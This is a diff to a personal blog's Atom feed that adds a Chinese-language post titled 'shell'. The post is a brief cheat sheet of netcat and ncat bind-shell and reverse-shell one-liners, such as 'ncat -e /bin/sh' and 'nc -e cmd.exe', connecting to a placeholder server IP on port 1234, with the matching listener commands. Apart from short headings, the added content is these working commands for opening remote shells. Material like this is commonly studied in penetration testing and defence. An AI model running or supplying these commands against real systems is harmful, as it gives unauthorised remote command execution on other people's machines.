@@ -6,7 +6,7 @@
   <link href="http://mikeytki.github.io/atom.xml" rel="self"/>
   
   <link href="http://mikeytki.github.io/"/>
-  <updated>2023-09-14T03:57:12.149Z</updated>
+  <updated>2023-11-03T06:59:25.826Z</updated>
   <id>http://mikeytki.github.io/</id>
   
   <author>
@@ -15,6 +15,23 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>shell</title>
+    <link href="http://mikeytki.github.io/posts/4592b2fd.html"/>
+    <id>http://mikeytki.github.io/posts/4592b2fd.html</id>
+    <published>2023-11-03T01:17:06.000Z</published>
+    <updated>2023-11-03T06:59:25.826Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="正向连接"><a href="#正向连接" class="headerlink" title="正向连接"></a>正向连接</h1><h2 id="本地监听端口"><a href="#本地监听端口" class="headerlink" title="本地监听端口"></a>本地监听端口</h2><p><font color=red size=3>绑定SH到本地1234端口</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ncat -e /bin/sh -lvp 1234</span><br><span class="line">nc -e cmd.exe -lvp 1234</span><br></pre></td></tr></table></figure><p><font color=red size=3>主动连接目标1234</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ncat x.x.x.x(对方服务器IP) 1234</span><br><span class="line">nc x.x.x.x(对方服务器IP) 1234</span><br></pre></td></tr></table></figure><h1 id="反向连接"><a href="#反向连接" class="headerlink" title="反向连接"></a>反向连接</h1><h2 id="远程监听端口"><a href="#远程监听端口" class="headerlink" title="远程监听端口"></a>远程监听端口</h2><p><font color=red size=3>绑定SH到对方服务器1234端口</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ncat -e /bin/sh x.x.x.x(对方服务器IP) 1234 </span><br><span class="line">nc -e cmd x.x.x.x(对方服务器IP) 1234</span><br></pre></td></tr></table></figure><p><font color=red size=3>监听本地端口1234</font></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ncat -lvvp 1234</span><br><span class="line">nc -lvvp 1234</span><br></pre></td></tr></table></figure>]]></content>
+    
+    
+    <summary type="html">web</summary>
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>墨者</title>
